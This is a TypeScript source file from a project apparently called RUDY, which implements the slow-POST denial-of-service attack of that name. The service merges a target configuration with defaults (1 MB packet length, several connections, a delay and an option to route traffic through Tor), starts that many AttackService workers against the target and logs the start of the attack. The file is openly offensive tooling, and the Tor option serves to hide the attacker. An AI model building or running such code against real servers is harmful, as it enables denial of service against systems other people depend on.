//
//  rudy.service.ts
//  RUDY
//
//  Created by Sahil Chaddha on 08/05/2018.
//  Copyright © 2018 RUDY. All rights reserved.
//

import logger, { LogLevel } from "../utils/logger"
import * as Error from "../models/error.model"
import { HTTPMethod } from "./network.service"
import AttackService, { IAttackServiceResponsePayload } from "./attack.service"
import IService from "./service"
/* tslint:disable array-type object-literal-sort-keys */

export interface IRudyConfig {
    target: string
    method: HTTPMethod
    packet_len: number
    maxConnections?: number
    delay: number
    shouldUseTor: boolean
}

const defaultConfig: IRudyConfig = {
    target: "http://localhost:80/",
    method: HTTPMethod.POST,
    packet_len: 1 * 1024 * 1024, // 1 MB
    maxConnections: 5,
    delay: 2,
    shouldUseTor: false,
}

class RudyService implements IService {
    public serviceName: string = "Rudy_Service"
    private config: IRudyConfig
    private attacks: AttackService[]
    constructor(config: IRudyConfig) {
        this.config = defaultConfig
        this.mapConfig(config)
        this.attacks = []
    }

    public attack() {
        for (var i = 0; i < this.config.maxConnections; i++) {
            const attackService = new AttackService({target: this.config.target, method: this.config.method,
                                                     packet_len: this.config.packet_len, delay: this.config.delay,
                                                     shouldUseTor: this.config.shouldUseTor, attackId: i})
            attackService.attack()
            this.attacks.push(attackService)
        }

        logger.info({message: "Attack Started at " + this.config.target + " With Workers : " +
                     this.config.maxConnections,
                     category: this.serviceName})
    }

    private mapConfig(config: IRudyConfig) {
        Object.keys(config).forEach((key, index) => {
            if (config[key] != null) {
                this.config[key] = config[key]
            }
        })
    }
}

export default RudyService
